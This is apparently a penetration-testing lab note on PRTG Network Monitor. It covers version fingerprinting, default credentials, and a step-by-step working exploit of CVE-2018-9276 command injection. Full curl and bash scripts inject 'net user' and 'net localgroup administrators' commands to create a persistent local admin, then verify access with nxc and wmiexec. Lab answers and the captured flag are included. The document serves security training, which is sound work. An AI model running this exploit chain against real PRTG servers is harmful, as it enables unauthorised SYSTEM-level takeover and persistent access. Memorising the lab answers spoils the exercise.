# Section 15 — PRTG Network Monitor: Discovery & Attack

PRTG is an agentless network monitor (Paessler). Runs on IIS/Indy HTTP server. Common on internal networks. When exploited, runs as SYSTEM.

Default port: `8080` (web UI). Version visible in HTTP response and page source.

---

## Fingerprinting

### Version — from page source (unauthenticated)
```bash
curl -s http://TARGET:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" \
  | grep -oP 'prtgversion=\K[\d.]+'
# 18.1.37.13946
```

### Nmap detection
```
8080/tcp open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```
`Indy httpd` + `PRTG bandwidth monitor` in service banner = PRTG confirmed.

### Default credentials
- `prtgadmin:prtgadmin` (default, often unchanged)
- `prtgadmin:Password123` (common password)

### API login check
```bash
curl -s "http://TARGET:8080/api/getpasshash.htm?username=prtgadmin&password=prtgadmin"
# Returns passhash integer if valid, 401 if wrong
```

---

## CVE-2018-9276 — Authenticated Command Injection

**Affects:** PRTG < 18.2.39  
**Requires:** Admin credentials  
**Impact:** OS command execution as SYSTEM

The notification "Execute Program" feature passes the `Parameter` field directly to PowerShell without sanitization. Inject after a filename: `outfile.txt;[command]`

### Attack Flow

```
1. Get session cookie via login
2. POST to /editsettings with objecttype=notification&id=new
   → active_10=10 (Execute Program), address_10=Demo EXE Notification - OutFile.ps1
   → message_10="outfile.txt;[injected command]"
3. POST to /api/notificationtest.htm?id=[new_id] to trigger
```

### Step 1 — Get session cookie

```bash
URL="http://TARGET:8080"
curl -s -c /tmp/prtg.txt "$URL/index.htm" -o /dev/null
curl -s -c /tmp/prtg.txt -b /tmp/prtg.txt \
  -X POST "$URL/index.htm" \
  -d "loginurl=/welcome.htm&username=prtgadmin&password=Password123" \
  -L -o /dev/null
COOKIE=$(grep OCTOPUS /tmp/prtg.txt | awk '{print $6"="$7}')
echo "Cookie: $COOKIE"
```

### Step 2 — Create notification with injection

```bash
# Add local admin user (prtgadm1:Pwn3d_by_PRTG!)
DATA="name_=pwn&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=INJECT_HERE&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2"
```

**INJECT_HERE** (URL-encoded, include outer quotes):

| Command | URL-encoded message_10 |
|---------|----------------------|
| Add user | `%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+prtgadm1+Pwn3d_by_PRTG!+%2Fadd%22` |
| Add to admins | `%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+localgroup+administrators+%2Fadd+prtgadm1%22` |

```bash
RESULT=$(curl -s \
  -H "Referer: $URL/editnotification.htm?id=new&tabid=1" \
  -H "X-Requested-With: XMLHttpRequest" \
  -X POST --data "$DATA" --cookie "$COOKIE" \
  "$URL/editsettings")
NOTIF_ID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['objid'])")
echo "Notification ID: $NOTIF_ID"
```

### Step 3 — Trigger notification

```bash
curl -s \
  -H "Referer: $URL/myaccount.htm?tabid=2" \
  -H "X-Requested-With: XMLHttpRequest" \
  -X POST --data "id=$NOTIF_ID" --cookie "$COOKIE" \
  "$URL/api/notificationtest.htm"
# Response: "EXE notification is queued up"
```

### Step 4 — Verify and read flag

```bash
sleep 5
nxc smb TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'
# [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)

# Read flag via wmiexec
wmiexec.py 'prtgadm1:Pwn3d_by_PRTG!@TARGET' "type C:\Users\Administrator\Desktop\flag.txt"
```

---

## Key Technical Details

- **Injection point:** `message_10` parameter in the notification POST
- **Required:** `objecttype=notification` in POST body — missing this causes "Class TOct not found" error
- **Injection format:** wrap the whole parameter in quotes: `"outfile.txt;command"`  
  → The PS1 script receives `outfile.txt;command` as the -OutputFile arg — the `;` starts a new PS statement
- **Execute Program checkbox:** `active_10=10` (needs to appear twice in POST — once `0` for hidden, once `10` for checkbox)
- **Script file:** `Demo EXE Notification - OutFile.ps1` → URL-encoded: `Demo+EXE+Notification+-+OutFile.ps1`
- **PRTG runs as SYSTEM** → any executed command runs with SYSTEM privileges

### Two-step user creation (PoC does this separately)
1. `net user prtgadm1 Pwn3d_by_PRTG! /add` — create user
2. `net localgroup administrators /add prtgadm1` — add to admins

Both can be combined: `outfile.txt;net user X P! /add;net localgroup administrators /add X`

### Searchsploit
```bash
searchsploit PRTG
# windows/webapps/46527.sh  PRTG Network Monitor 18.2.38 Authenticated RCE (CVE-2018-9276)
```

---

## Exam Notes

- PRTG version in `prtgversion=` CSS link or page footer (unauthenticated)
- Default creds: `prtgadmin:prtgadmin` — check these first
- CVE-2018-9276 affects PRTG < 18.2.39 — check version before attempting
- `objecttype=notification` is required in POST — the PoC script (46527.sh) includes it; raw form POST without it fails
- Passhash API: `GET /api/getpasshash.htm?username=X&password=Y` → returns integer token for API calls
- Notification test brute-force IDs: `for i in {200..250}; do curl -X POST --data "id=$i" ...notificationtest.htm; done`
- PRTG is always worth adding a user rather than just getting output — gives persistent access

---

## Lab Walkthrough (`10.129.201.50:8080`)

**Q1 — PRTG version:** `18.1.37.13946`

```bash
curl -s "http://10.129.201.50:8080/index.htm" -A "Mozilla/5.0" | grep -oP 'prtgversion=\K[\d.]+'
```

**Q2 — Flag on Administrator Desktop:** `WhOs3_m0nit0ring_wH0?`

```bash
URL="http://10.129.201.50:8080"

# Login
curl -s -c /tmp/prtg.txt "$URL/index.htm" -o /dev/null
curl -s -c /tmp/prtg.txt -b /tmp/prtg.txt -X POST "$URL/index.htm" \
  -d "loginurl=/welcome.htm&username=prtgadmin&password=Password123" -L -o /dev/null
COOKIE=$(grep OCTOPUS /tmp/prtg.txt | awk '{print $6"="$7}')

# Create add-user notification (message_10 = URL-encoded "tester.txt;net user prtgadm1 Pwn3d_by_PRTG! /add")
# [use full DATA string from Step 2 above with add-user INJECT_HERE]
RESULT=$(curl -s -H "Referer: $URL/editnotification.htm?id=new&tabid=1" \
  -H "X-Requested-With: XMLHttpRequest" -X POST --data "$DATA" --cookie "$COOKIE" "$URL/editsettings")
NOTIF_ID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['objid'])")
curl -s -H "X-Requested-With: XMLHttpRequest" -X POST --data "id=$NOTIF_ID" \
  --cookie "$COOKIE" "$URL/api/notificationtest.htm"

sleep 5

# Create add-to-admins notification (message_10 = URL-encoded "tester.txt;net localgroup administrators /add prtgadm1")
# [use full DATA string with admin INJECT_HERE]
RESULT2=$(curl -s -H "Referer: $URL/editnotification.htm?id=new&tabid=1" \
  -H "X-Requested-With: XMLHttpRequest" -X POST --data "$DATA2" --cookie "$COOKIE" "$URL/editsettings")
NOTIF_ID2=$(echo $RESULT2 | python3 -c "import sys,json; print(json.load(sys.stdin)['objid'])")
curl -s -H "X-Requested-With: XMLHttpRequest" -X POST --data "id=$NOTIF_ID2" \
  --cookie "$COOKIE" "$URL/api/notificationtest.htm"

sleep 5
nxc smb 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'
# [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)

wmiexec.py 'prtgadm1:Pwn3d_by_PRTG!@10.129.201.50' "type C:\Users\Administrator\Desktop\flag.txt"
# WhOs3_m0nit0ring_wH0?
```

**Credentials used:** `prtgadmin:Password123`  
**Created user:** `prtgadm1:Pwn3d_by_PRTG!` (local admin)  
**Flag:** `WhOs3_m0nit0ring_wH0?`  
**Running as:** SYSTEM
